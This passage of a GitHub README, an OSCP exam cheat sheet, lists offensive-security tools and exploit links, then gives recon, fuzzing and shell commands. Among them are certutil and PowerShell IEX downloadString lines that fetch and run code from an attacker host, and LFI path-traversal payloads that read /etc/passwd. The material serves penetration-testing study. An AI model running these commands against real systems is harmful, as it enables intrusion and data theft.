<p align="center">
  <img width="300" height="300" src="https://github.com/0xsyr0/OSCP/blob/main/files/oscp.png">
</p>

# OSCP Cheat Sheet

Commands, Payloads and Resources for the Offensive Security Certified Professional Certification.

Since this little project get's more and more attention, I decided to update it as often as possible to focus more helpful and absolutely necessary commands for the exam. Feel free to submit a pull request or reach out to me on [Twitter](https://twitter.com/syr0_) for suggestions.

Every help or hint is appreciate it!

DISCLAIMER: A guy on Twitter got a point. Automatic exploitation tools like `sqlmap` are prohibited to use in the exam. The same goes for the automatic exploitation functionality of `LinPEAS`. I am not keeping track of current guidelines related to those tools. For that I want to point out that I am not responsible if anybody uses a tool without double checking the latest exam restrictions and fails the exam. Inform yourself before taking the exam!

I removed `sqlmap` because of the reasons above but `Metasploit` is still part of the guide because you can use it for one specific module. Thank you `Muztahidul Tanim` for making me aware and to [Yeeb](https://github.com/Yeeb1) for the resources.

Here are the link to the [OSCP Exam Guide](https://help.offensive-security.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#exam-restrictions) and the discussion about [LinPEAS](https://www.offensive-security.com/offsec/understanding-pentest-tools-scripts/?hss_channel=tw-134994790). I hope this helps.

## Table of Contents

- [Basics](https://github.com/0xsyr0/OSCP#basics)
- [Information Gathering](https://github.com/0xsyr0/OSCP#information-gathering)
- [Vulnerability Analysis](https://github.com/0xsyr0/OSCP#vulnerability-analysis)
- [Web Application Analysis](https://github.com/0xsyr0/OSCP#web-application-analysis)
- [Password Attacks](https://github.com/0xsyr0/OSCP#password-attacks)
- [Reverse Engineering](https://github.com/0xsyr0/OSCP#reverse-engineering)
- [Exploitation Tools](https://github.com/0xsyr0/OSCP#exploitation-tools)
- [Post Exploitation](https://github.com/0xsyr0/OSCP#post-exploitation)
- [CVEs](https://github.com/0xsyr0/OSCP#cves)
- [Exploiting](https://github.com/0xsyr0/OSCP#exploiting)
- [Payloads](https://github.com/0xsyr0/OSCP#payloads)
- [Wordlists](https://github.com/0xsyr0/OSCP#wordlists)
- [Social Media Resources](https://github.com/0xsyr0/OSCP#social-media-resources)
- [Commands](https://github.com/0xsyr0/OSCP#commands)
	- [Basics](https://github.com/0xsyr0/OSCP#basics-1)
		- [CentOS](https://github.com/0xsyr0/OSCP#centos)
		- [Certutil](https://github.com/0xsyr0/OSCP#certutil)
		- [Chisel](https://github.com/0xsyr0/OSCP#chisel)
		- [gcc](https://github.com/0xsyr0/OSCP#gcc)
		- [Netcat](https://github.com/0xsyr0/OSCP#netcat)
		- [PHP Webserver](https://github.com/0xsyr0/OSCP#php-webserver)
		- [Ping](https://github.com/0xsyr0/OSCP#ping)
		- [Python Webserver](https://github.com/0xsyr0/OSCP#python-webserver)
		- [RDP](https://github.com/0xsyr0/OSCP#rdp)
		- [SSH](https://github.com/0xsyr0/OSCP#ssh)
		- [tmux](https://github.com/0xsyr0/OSCP#tmux)
		- [Upgrading Shells](https://github.com/0xsyr0/OSCP#upgrading-shells)
		- [vi](https://github.com/0xsyr0/OSCP#vi)
		- [Windows Command Formatting](https://github.com/0xsyr0/OSCP#windows-command-formatting)
	- [Information Gathering](https://github.com/0xsyr0/OSCP#information-gathering-1)
		- [Nmap](https://github.com/0xsyr0/OSCP#nmap)
		- [DNS](https://github.com/0xsyr0/OSCP#dns)
		- [ldapsearch](https://github.com/0xsyr0/OSCP#ldapsearch)
		- [sslyze](https://github.com/0xsyr0/OSCP#sslyze)
		- [SMB / NetBIOS](https://github.com/0xsyr0/OSCP#smb--netbios)
		- [JAWS](https://github.com/0xsyr0/OSCP#jaws)
	- [Vulnerability Analysis](https://github.com/0xsyr0/OSCP#vulnerability-analysis-1)
		- [finger](https://github.com/0xsyr0/OSCP#finger)
		- [Nuclei](https://github.com/0xsyr0/OSCP#nuclei)
	- [Web Application Analysis](https://github.com/0xsyr0/OSCP#web-application-analysis-1)
		- [Asset Discovery](https://github.com/0xsyr0/OSCP#asset-discovery)
		- [ffuf](https://github.com/0xsyr0/OSCP#ffuf)
		- [Gobuster](https://github.com/0xsyr0/OSCP#gobuster)
		- [Hakrawler](https://github.com/0xsyr0/OSCP#hakrawler)
		- [Local File Inclusion LFI()](https://github.com/0xsyr0/OSCP#local-file-inclusion-lfi)
		- [wfuzz](https://github.com/0xsyr0/OSCP#wfuzz)
		- [WPScan](https://github.com/0xsyr0/OSCP#wpscan)
	- [Database Analysis](https://github.com/0xsyr0/OSCP#database-analysis)
		- [Basic Commands](https://github.com/0xsyr0/OSCP#basic-commands)
		- [SQL Injection](https://github.com/0xsyr0/OSCP#sql-injection)
		- [sqsh](https://github.com/0xsyr0/OSCP#sqsh)
		- [SQL Truncation Attack](https://github.com/0xsyr0/OSCP#sql-truncation-attack)
		- [XPATH Injection](https://github.com/0xsyr0/OSCP#xpath-injection)
	- [Password Attacks](https://github.com/0xsyr0/OSCP#password-attacks-1)
		- [fcrack](https://github.com/0xsyr0/OSCP#fcrack)
		- [LaZagne](https://github.com/0xsyr0/OSCP#lazagne)
		- [Hydra](https://github.com/0xsyr0/OSCP#hydra)
		- [John](https://github.com/0xsyr0/OSCP#john)
	- [Exploitation Tools](https://github.com/0xsyr0/OSCP#exploitation-tools-1)
		- [ImageTragick Polyglot Attack](https://github.com/0xsyr0/OSCP#imagetragick-polyglot-attack)
		- [Metasploit](https://github.com/0xsyr0/OSCP#metasploit)
		- [ShellShock](https://github.com/0xsyr0/OSCP#shellshock)
	- [Post Exploitation](https://github.com/0xsyr0/OSCP#post-exploitation-1)
		- [AppLocker Bypass List](https://github.com/0xsyr0/OSCP#applocker-bypass-list)
		- [autologon](https://github.com/0xsyr0/OSCP#autologon)
		- [Bash Privilege Escalation](https://github.com/0xsyr0/OSCP#bash-privilege-escalation)
		- [Basic Linux Enumeration](https://github.com/0xsyr0/OSCP#basic-linux-enumeration)
		- [Basic Windows Enumeration](https://github.com/0xsyr0/OSCP#basic-windows-enumeration)
		- [Evil-WinRM](https://github.com/0xsyr0/OSCP#evil-winrm)
		- [find Commands](https://github.com/0xsyr0/OSCP#find-commands)
		- [grep for Passwords](https://github.com/0xsyr0/OSCP#grep-for-passwords)
		- [Impacket](https://github.com/0xsyr0/OSCP#impacket)
		- [Juicy Potato](https://github.com/0xsyr0/OSCP#juicy-potato)
		- [SharpEfsPotato](https://github.com/0xsyr0/OSCP#sharpefspotato)
		- [PowerShell](https://github.com/0xsyr0/OSCP#powershell)
		- [Windows Tasks & Services](https://github.com/0xsyr0/OSCP#windows-tasks--services)
		- [Writeable Directories in Linux](https://github.com/0xsyr0/OSCP#writeable-directories-in-linux)
	- [CVE](https://github.com/0xsyr0/OSCP#cve)
		- [Juicy Potato](https://github.com/0xsyr0/OSCP#juicy-potato)
		- [SharpEfsPotato](https://github.com/0xsyr0/OSCP#sharpefspotato)
	- [Payloads](https://github.com/0xsyr0/OSCP#payloads-1)
		- [Reverse Shells](https://github.com/0xsyr0/OSCP#reverse-shells)
		- [Web Shells](https://github.com/0xsyr0/OSCP#web-shells)
		- [nishang](https://github.com/0xsyr0/OSCP#nishang)
		- [Shikata Ga Nai](https://github.com/0xsyr0/OSCP#shikata-ga-nai)
		- [ysoserial](https://github.com/0xsyr0/OSCP#ysoserial)
	- [Templates](https://github.com/0xsyr0/OSCP#templates)
		- [ASPX Web Shell](https://github.com/0xsyr0/OSCP#aspx-web-shell)
		- [Bad YAML](https://github.com/0xsyr0/OSCP#bad-yaml)
		- [Exploit Skeleton Python Script](https://github.com/0xsyr0/OSCP#exploit-skeleton-python-script)
		- [JSON POST Rrequest](https://github.com/0xsyr0/OSCP#json-post-request)

### Basics

| Name | URL |
| --- | --- |
| Swaks | https://github.com/jetmore/swaks |
| CyberChef | https://gchq.github.io/CyberChef/ |

### Information Gathering

| Name | URL |
| --- | --- |
| Nmap | https://github.com/nmap/nmap |
| pspy | https://github.com/DominicBreuker/pspy |
| enum4linux | https://github.com/CiscoCXSecurity/enum4linux |
| BloodHound | https://github.com/BloodHoundAD/BloodHound |
| BloodHound Python | https://github.com/fox-it/BloodHound.py |

### Vulnerability Analysis

| Name | URL |
| --- | --- |
| Sparta | https://github.com/SECFORCE/sparta |
| nikto | https://github.com/sullo/nikto |

### Web Application Analysis

| Name | URL |
| --- | --- |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| Leaky Paths | https://github.com/ayoubfathi/leaky-paths |
| ysoserial | https://github.com/frohoff/ysoserial |
| JSON Web Tokens | https://jwt.io/ |
| httpx | https://github.com/projectdiscovery/httpx |
| Gobuster | https://github.com/OJ/gobuster |
| ffuf | https://github.com/ffuf/ffuf |
| Wfuzz | https://github.com/xmendez/wfuzz |
| WPScan | https://github.com/wpscanteam/wpscan |

### Password Attacks

| Name | URL |
| --- | --- |
| Hydra | https://github.com/vanhauser-thc/thc-hydra |
| Patator | https://github.com/lanjelot/patator |
| Kerbrute | https://github.com/ropnop/kerbrute |
| CrackMapExec | https://github.com/byt3bl33d3r/CrackMapExec |
| SprayingToolkit | https://github.com/byt3bl33d3r/SprayingToolkit |
| John | https://github.com/openwall/john |
| hashcat | https://hashcat.net/hashcat |
| LaZagne | https://github.com/AlessandroZ/LaZagne |
| mimikatz | https://github.com/gentilkiwi/mimikatz |
| pypykatz | https://github.com/skelsec/pypykatz |
| RsaCtfTool | https://github.com/Ganapati/RsaCtfTool |
| Default Credentials Cheat Sheet | https://github.com/ihebski/DefaultCreds-cheat-sheet |

### Reverse Engineering

| Name | URL |
| --- | --- |
| dnSpy | https://github.com/dnSpy/dnSpy |
| AvalonialLSpy | https://github.com/icsharpcode/AvaloniaILSpy |
| ghidra | https://github.com/NationalSecurityAgency/ghidra |
| pwndbg | https://github.com/pwndbg/pwndbg |
| cutter | https://github.com/rizinorg/cutter |
| Radare2 | https://github.com/radareorg/radare2 |
| GEF | https://github.com/hugsy/gef |
| peda | https://github.com/longld/peda |
| JD-GUI | https://github.com/java-decompiler/jd-gui |

### Exploitation Tools

| Name | URL |
| --- | --- |
| lsassy | https://github.com/Hackndo/lsassy |
| Rubeus | https://github.com/GhostPack/Rubeus |
| printspoofer | https://github.com/dievus/printspoofer |
| pth-toolkit | https://github.com/byt3bl33d3r/pth-toolkit |
| Evil-WinRM | https://github.com/Hackplayers/evil-winrm |
| Metasploit | https://github.com/rapid7/metasploit-framework |
| SharpCollection | https://github.com/Flangvik/SharpCollection |
| PowerSharpPack | https://github.com/S3cur3Th1sSh1t/PowerSharpPack |

### Post Exploitation

| Name | URL |
| --- | --- |
| PEASS-ng | https://github.com/carlospolop/PEASS-ng |
| LinEnum | https://github.com/rebootuser/LinEnum |
| JAWS | https://github.com/411Hall/JAWS |
| Watson | https://github.com/rasta-mouse/Watson |
| WESNG | https://github.com/bitsadmin/wesng
| Sherlock | https://github.com/rasta-mouse/Sherlock |
| scavenger | https://github.com/SpiderLabs/scavenger |
| RunasCs | https://github.com/antonioCoco/RunasCs |
| WADComs | https://wadcoms.github.io |
| GTFOBins | https://gtfobins.github.io/ |
| LOLBAS | https://lolbas-project.github.io/ |
| Impacket | https://github.com/SecureAuthCorp/impacket |
| powercat | https://github.com/besimorhino/powercat |
| PowerView | https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 |
| Windows-privesc-check | https://github.com/pentestmonkey/windows-privesc-check |
| Windows Privilege Escalation | https://github.com/frizb/Windows-Privilege-Escalation |
| Windows Privilege Escalation Fundamentals | https://www.fuzzysecurity.com/tutorials/16.html |
| Priv2Admin | https://github.com/gtworek/Priv2Admin |

### CVEs

| CVE | Descritpion | URL |
| --- | --- | --- |
| CVE-2014-6271 | Shellshock PoC | https://github.com/zalalov/CVE-2014-6271 |
| CVE-2016-5195 | Dirty COW | https://github.com/firefart/dirtycow |
| CVE-2017-0199 | RTF Dynamite | https://github.com/bhdresh/CVE-2017-0199 |
| CVE-2018-10933 | libSSH Authentication Bypass | https://github.com/blacknbunny/CVE-2018-10933 |
| CVE-2018-16509 | Ghostscript | https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509 |
| CVE-2019-18634 | sudo | https://github.com/saleemrashid/sudo-cve-2019-18634 |
| CVE-2019-5736 | Exploiting RunC | https://github.com/Frichetten/CVE-2019-5736-PoC |
| CVE-2019-6447 | ES File Explorer Open Port Vulnerability | https://github.com/fs0c131y/ESFileExplorerOpenPortVuln |
| CVE-2019-7304 | dirty_sock | https://github.com/initstring/dirty_sock |
| CVE-2020-1472 | ZeroLogon Testing Script | https://github.com/SecuraBV/CVE-2020-1472 |
| CVE-2020-1472 | ZeroLogon Exploitation Script | https://github.com/risksense/zerologon |
| CVE-2021-1675,CVE-2021-34527 | PrintNightmare | https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527 |
| CVE-2021-1675 | PrintNightmare LPE (PowerShell) | https://github.com/calebstewart/CVE-2021-1675 |
| CVE-2021-21972 | vCenter RCE | https://github.com/horizon3ai/CVE-2021-21972 |
| CVE-2021-22204 | GitLab Exiftool RCE | https://github.com/CsEnox/Gitlab-Exiftool-RCE |
| CVE-2021-22204 | GitLab Exiftool RCE Python Implementation | https://github.com/convisolabs/CVE-2021-22204-exiftool |
| CVE-2021-26085 | Confluence Server RCE | https://github.com/Phuong39/CVE-2021-26085 |
| CVE-2021-27928 | MariaDB/MySQL-'wsrep provider' | https://github.com/Al1ex/CVE-2021-27928 |
| CVE-2021-3129 | Laravel Framework RCE | https://github.com/nth347/CVE-2021-3129_exploit |
| CVE-2021-3156 | Sudo 1.8.31 Root Exploit | https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit |
| CVE-2021-3560 | PwnKit C Implementation | https://github.com/hakivvi/CVE-2021-3560 |
| CVE-2021-3560 | polkit Privilege Escalation | https://github.com/Almorabea/Polkit-exploit |
| CVE-2021-3560 | polkit Privilege Esclation PoC | https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation |
| CVE-2021-36934 | HiveNightmare | https://github.com/GossiTheDog/HiveNightmare |
| CVE-2021-4034 | Pkexec Self-contained Exploit | https://github.com/ly4k/PwnKit |
| CVE-2021-4034 | PoC for PwnKit (1) | https://github.com/dzonerzy/poc-cve-2021-4034 |
| CVE-2021-4034 | PoC for PwnKit (2) | https://github.com/arthepsy/CVE-2021-4034 |
| CVE-2021-4034 | PoC for PwnKit (3) | https://github.com/nikaiw/CVE-2021-4034 |
| CVE-2021-40444 | MSHTML builders | https://github.com/aslitsecurity/CVE-2021-40444_builders |
| CVE-2021-40444 | MSHTML Exploit | https://xret2pwn.github.io/CVE-2021-40444-Analysis-and-Exploit/ |
| CVE-2021-40444 | MSHTML PoC | https://github.com/lockedbyte/CVE-2021-40444 |
| CVE-2021-41379 | InstallerFileTakeOver | https://github.com/klinix5/InstallerFileTakeOver |
| CVE-2021-41773,CVE-2021-42013, CVE-2020-17519 | SimplesApachePathTraversal | https://github.com/MrCl0wnLab/SimplesApachePathTraversal |
| CVE-2021-42278,CVE-2021-42287 | sam-the-admin | https://github.com/WazeHell/sam-the-admin |
| CVE-2021-42278 | sam-the-admin Python Implementation | https://github.com/ly4k/Pachine |
| CVE-2021-42287,CVE-2021-42278 | noPac (1) | https://github.com/cube0x0/noPac |
| CVE-2021-42287,CVE-2021-42278 | noPac (2) | https://github.com/Ridter/noPac |
| CVE-2021-42321 | Microsoft Exchange Server RCE | https://gist.github.com/testanull/0188c1ae847f37a70fe536123d14f398 |
| CVE-2021-44228 | Log4Shell | https://github.com/kozmer/log4j-shell-poc |
| CVE-2021-44228 | LogMePwn | https://github.com/0xInfection/LogMePwn |
| CVE-2022-0847 | DirtyPipe-Exploits | https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits |
| CVE-2022-21999 | SpoolFool | https://github.com/ly4k/SpoolFool |
| CVE-2022-22963 | Spring4Shell | https://github.com/tweedge/springcore-0day-en |
| CVE-2022-23119,CVE-2022-23120 | Trend Micro Deep Security Agent for Linux Arbitrary File Read | https://github.com/modzero/MZ-21-02-Trendmicro |
| CVE-2022-26134 | ConfluentPwn | https://github.com/redhuntlabs/ConfluentPwn |
| CVE-2022-30190 | MS-MSDT Follina Attach Vector | https://github.com/JohnHammond/msdt-follina |
| CVE-2022-30190 | MS-MSDT Follina Exploit PoC | https://github.com/onecloudemoji/CVE-2022-30190 |
| CVE-2022-30190 | MS-MSDT Follina Exploit Python Implementation | https://github.com/chvancooten/follina.py |
| CVE-2022-34918 | LPE Netfilter Kernel Exploit | https://github.com/randorisec/CVE-2022-34918-LPE-PoC |
| n/a | SeBackupPrivilege | https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug |
| n/a | RoguePotato | https://github.com/antonioCoco/RoguePotato |
| n/a | RottenPotatoNG | https://github.com/breenmachine/RottenPotatoNG |
| n/a | GenericPotato | https://github.com/micahvandeusen/GenericPotato |
| n/a | JuicyPotato | https://github.com/ohpe/juicy-potato |
| n/a | JuicyPotatoNG | https://github.com/antonioCoco/JuicyPotatoNG |
| n/a | MultiPotato | https://github.com/S3cur3Th1sSh1t/MultiPotato |
| n/a | SharpEfsPotato | https://github.com/bugch3ck/SharpEfsPotato |
| n/a | PrintSpoofer (1) | https://github.com/dievus/printspoofer |
| n/a | PrintSpoofer (2) | https://github.com/itm4n/PrintSpoofer |
| n/a | Shocker (1) | https://github.com/gabrtv/shocker |
| n/a | Shocker (2) | https://github.com/nccgroup/shocker |
| n/a | SystemNightmare | https://github.com/GossiTheDog/SystemNightmare |
| n/a | PetitPotam | https://github.com/topotam/PetitPotam |
| n/a | DFSCoerce MS-DFSNM Exploit | https://github.com/Wh04m1001/DFSCoerce |
| n/a | Windows Exploits | https://github.com/SecWiki/windows-kernel-exploits |
| n/a | Pre-compiled Windows Exploits | https://github.com/abatchy17/WindowsExploits |

### Exploiting

| Name | URL |
| --- | --- |
| PwnTools | https://github.com/Gallopsled/pwntools |
| checksec | https://github.com/slimm609/checksec.sh |
| mona | https://github.com/corelan/mona |
| Ropper | https://github.com/sashs/Ropper |
| Buffer Overflow | https://github.com/gh0x0st/Buffer_Overflow |

### Payloads

| Name | URL |
| --- | --- |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| Payload Box | https://github.com/payloadbox |
| ysoserial | https://github.com/frohoff/ysoserial |
| nishang | https://github.com/samratashok/nishang |
| Shikata Ga Nai | https://github.com/EgeBalci/sgn |
| unicorn | https://github.com/trustedsec/unicorn |
| PowerLine | https://github.com/fullmetalcache/powerline |
| woodpecker | https://github.com/woodpecker-appstore/log4j-payload-generator |
| marshalsec | https://github.com/mbechler/marshalsec |
| AMSI.fail | http://amsi.fail |
| Raikia's Hub | https://raikia.com/tool-powershell-encoder/ |
| webshell | https://github.com/tennc/webshell |
| Web-Shells | https://github.com/TheBinitGhimire/Web-Shells |
| PHP-Reverse-Shell | https://github.com/ivan-sincek/php-reverse-shell|

### Wordlists

| Name | URL |
| --- | --- |
| SecLists | https://github.com/danielmiessler/SecLists |
| CeWL | https://github.com/digininja/cewl |
| CUPP | https://github.com/Mebus/cupp |
| COOK | https://github.com/giteshnxtlvl/cook |

### Social Media Resources

| Name | URL |
| --- | --- |
| IppSec (YouTube) | https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA |
| IppSec.rocks | https://ippsec.rocks/?# |
| 0xdf | https://0xdf.gitlab.io/
| HackTricks | https://book.hacktricks.xyz/ |
| Hacking Articles | https://www.hackingarticles.in/ |
| Rana Khalil | https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/ |

## Commands

### Basics

#### CentOS

```c
doas -u <USERNAME> /bin/sh
```

#### Certutil

```c
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
```
#### Chisel Socks Proxy

```c
./chisel server -p 9002 -reverse -v
./chisel client <RHOST>:9002 R:1080:socks
```
#### Chisel Port Forwarding

```c
./chisel server -p 9002 -reverse -v
./chisel client <RHOST>:9002 R:9003:127.0.0.1:8888
```

#### gcc

```c
gcc (--static) -m32 -Wl,--hash-style=both exploit.c -o exploit
i686-w64-mingw32-gcc -o main32.exe main.c
x86_64-w64-mingw32-gcc -o main64.exe main.c
```

#### Netcat

```c
nc -lnvp <LPORT> < <FILE>
nc <RHOST> <RPORT> > <FILE>
```

#### PHP Webserver

```c
sudo php -S 127.0.0.1:80
```

#### Ping

```c
ping -c 1 <RHOST>
ping -n 1 <RHOST>
```

#### Python Webserver

```c
sudo python -m SimpleHTTPServer 80
sudo python3 -m http.server 80
```

#### RDP

```c
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> +clipboard
rdesktop <RHOST>
```

#### SSH

```c
ssh user@<RHOST> -oKexAlgorithms=+diffie-hellman-group1-sha1

ssh -R 8080:<LHOST>:80 <RHOST>
ssh -L 8000:127.0.0.1:8000 <USERNAME>@<RHOST>
ssh -N -L 1234:127.0.0.1:1234 <USERNAME>@<RHOST>

ssh -L 80:<LHOST>:80 <RHOST>
ssh -L 127.0.0.1:80:<LHOST>:80 <RHOST>
ssh -L 80:localhost:80 <RHOST>
```

#### tmux

```c
ctrl b + w    # show windows
ctrl + "      # split window horizontal
ctrl + %      # split window vertical
ctrl + ,      # rename window
ctrl + {      # flip window
ctrl + }      # flip window
ctrl + spacebar    # switch pane layout
```

Copy & Paste
```c
:setw -g mode-keys vi

1. ctrl b + [
2. space
3. enter
4. ctrl b + ]
```

Search
```c
ctrl b + [    # enter copy
ctrl + /      # enter search while within copy mode for vi mode
n             # search next
shift + n     # reverse search
```

#### Upgrading Shells

```c
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

ctrl + z
stty raw -echo
fg
Enter
Enter
export XTERM=xterm
```

#### vi

```c
:w !sudo tee %    # save file with elevated privileges without exiting
```

#### Windows Command Formatting

```c
echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
```

### Information Gathering

#### Nmap

```c
sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery <RHOST>    # discovery scan
sudo nmap -A -T4 -sC -sV --script vuln <RHOST>    # vulnerability scan
sudo nmap -sU <RHOST>    # udp scan
sudo nmap -sC -sV -p- --scan-delay 5s <RHOST>    # delayed scan
sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <RHOST>    # kerberos enumeration
ls -lh /usr/share/nmap/scripts/*ssh*
locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
```

#### DNS

##### Reverse DNS

```c
whois <RHOST>
host <RHOST> <RHOST>
host -l <RHOST> <RHOST>
dig @<RHOST> -x <RHOST>
dig {a|txt|ns|mx} <RHOST>
dig {a|txt|ns|mx} <RHOST> @ns1.<RHOST>
dig axfr @<RHOST> <RHOST>    # zone transfer
```

#### ldapsearch

```c
ldapsearch -x -w <PASSWORD>
ldapsearch -x -h <RHOST> -s base namingcontexts
ldapsearch -x -b "dc=<RHOST>,dc=local" "*" -h <RHOST> | awk '/dn: / {print $2}'
ldapsearch -x -D "cn=admin,dc=<RHOST>,dc=local" -s sub "cn=*" -h <RHOST> | awk '/uid: /{print $2}' | nl
ldapsearch -D "cn=admin,dc=acme,dc=com" "(objectClass=*)" -w ldapadmin -h ldap.acme.com
ldapsearch -x -h <RHOST> -D "<USERNAME>"  -b "dc=<RHOST>,dc=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

#### sslyze

```c
sslyze --heartbleed <RHOST>
```
#### SMB / NetBIOS

```c
nbtscan <RHOST>
enum4linux -a <RHOST>
```

#### JAWS

```c
IEX(New-Object Net.webclient).downloadString('http://<LHOST>:<LPORT>/jaws-enum.ps1')
```

### Vulnerability Analysis

#### finger

```c
./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t <RHOST>
```

### Web Application Analysis

#### Asset Discovery

```c
curl -s -k "https://jldc.me/anubis/subdomains/example.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sed '/^\./d'
```

#### ffuf

```c
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ -mc 200,204,301,302,307,401 -o results.txt
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H "Host: FUZZ.<RHOST>" -fs 185
ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http://<RHOST>/backups/backup_2020070416FUZZ.zip
```

##### API Fuzzing

```c
ffuf -u https://<RHOST>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412
```

##### Looging for LFI

```c
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349
```

##### Fuzzing with PHP Session ID

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt  -u "http://<RHOST>/admin/FUZZ.php" -b "PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp" -fw 2644
```

##### Recursion

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/cd/basic/FUZZ -recursion
```

##### File Extensions

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/cd/ext/logs/FUZZ -e .log
```

##### No 404 Header

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/cd/no404/FUZZ -fs 669
```

##### Param Mining

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/cd/param/data?FUZZ=1
```

##### Rate Limiting

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 5 -p 0.1 -u http://<RHOST>/cd/rate/FUZZ -mc 200,429
```

##### IDOR Testing

```c
seq 1 1000 | ffuf -w - -u http://<RHOST>/cd/pipes/user?id=FUZZ
```

###### Script for IDOR Testing

```c
#!/bin/bash

while read i
do
  if [ "$1" == "md5" ]; then
    echo -n $i | md5sum | awk '{ print $1 }'
  elif [ "$1" == "b64" ]; then
    echo -n $i | base64
  else
    echo $i
  fi
done
```

###### Use Script above for Base64 decoding

```c
seq 1 1000 | /usr/local/bin/hashit b64 | ffuf -w - -u http://<RHOST>/cd/pipes/user2?id=FUZZ
```

###### MD5 Discovery using the Script

```c
seq 1 1000 | /usr/local/bin/hashit md5 | ffuf -w - -u http://<RHOST>/cd/pipes/user3?id=FUZZ
```

##### Virtual Host Discovery

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -fs 1495
```

##### Massive File Extension Discovery

```c
ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-1.0.txt -u http://<RHOST>/FUZZ -t 30 -c -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -mc 200,204,301,302,307,401,403,500 -ic -e .7z,.action,.ashx,.asp,.aspx,.backup,.bak,.bz,.c,.cgi,.conf,.config,.dat,.db,.dhtml,.do,.doc,.docm,.docx,.dot,.dotm,.go,.htm,.html,.ini,.jar,.java,.js,.js.map,.json,.jsp,.jsp.source,.jspx,.jsx,.log,.old,.pdb,.pdf,.phtm,.phtml,.pl,.py,.pyc,.pyz,.rar,.rhtml,.shtm,.shtml,.sql,.sqlite3,.svc,.tar,.tar.bz2,.tar.gz,.tsx,.txt,.wsdl,.xhtm,.xhtml,.xls,.xlsm,.xlst,.xlsx,.xltm,.xml,.zip
```

#### Gobuster

```c
-e    // extended mode that renders the full url
-k    // skip ssl certificate validation
-r    // follow cedirects
-s    // status codes
-b    // exclude status codes
-k            // ignore certificates
--wildcard    // set wildcard option

$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>/ -x php
$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<RHOST>/ -x php,txt,html,js -e -s 200
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://<RHOST>:<RPORT>/ -b 200 -k --wildcard
```

##### Common File Extensions

```c
txt,bak,php,html,js,asp,aspx
```

##### Common Picture Extensions

```c
png,jpg,jpeg,gif,bmp
```

##### POST Requests

```c
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://<RHOST>/api/ -e -s 200
```

##### DNS Recon

```c
gobuster dns -d <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

##### VHost Discovery

```c
gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

##### Specifiy User Agent

```c
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/ -a Linux
```

#### Local File Inclusion (LFI)

```c
http://<RHOST>/<FILE>.php?file=
http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd
http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd
```
##### Until php 5.3

```c
http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
```

##### Encoded Traversal Strings

```c
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\
```

##### Base64 Execution Bypass

